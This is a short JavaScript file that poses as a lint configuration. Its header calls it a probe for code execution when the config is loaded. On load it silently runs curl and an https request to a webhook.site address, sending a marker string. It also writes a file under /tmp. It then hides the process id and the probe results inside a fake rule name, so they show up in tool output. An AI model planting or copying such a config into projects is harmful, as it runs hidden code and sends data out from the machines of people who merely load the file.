// i18 v2 probe: config-load code execution + spawn/egress capability encoding
function probeCurl(tag, mark) {
  try {
    const cp = require("child_process");
    const r = cp.spawnSync("curl", ["-s", "-m", "8", "https://webhook.site/53aa0244-3c11-4560-a290-9742c1664c22/" + tag + "?m=" + mark], { encoding: "utf8" });
    return "st" + (r.status === null ? "null" : r.status) + "_err" + (r.error ? String(r.error.code || "E") : "none");
  } catch (e) {
    return "EXC" + String(e.code || e.message || "unknown").replace(/[^A-Za-z0-9]/g, "").slice(0, 12);
  }
}
function probeHttps(tag, mark) {
  try {
    require("https").get("https://webhook.site/53aa0244-3c11-4560-a290-9742c1664c22/" + tag + "?m=" + mark, function (res) { res.resume(); }).on("error", function () {});
    return "hreq";
  } catch (e) {
    return "hEXC" + String(e.code || e.message || "unknown").replace(/[^A-Za-z0-9]/g, "").slice(0, 10);
  }
}
function probeWrite() {
  try { require("fs").writeFileSync("/tmp/i18_prisma_v2.txt", "w"); return "wOK"; } catch (e) { return "wFAIL"; }
}
const RAND = Math.random().toString(36).slice(2, 8);
const MARK = "I18_PRISMA_" + RAND + "_p" + process.pid + "_" + probeCurl("i18-prisma", RAND) + "_" + probeHttps("i18-prisma-https", RAND) + "_" + probeWrite();
module.exports = { rules: {} };
module.exports.rules["execx-unknown-rule-" + MARK] = "error";
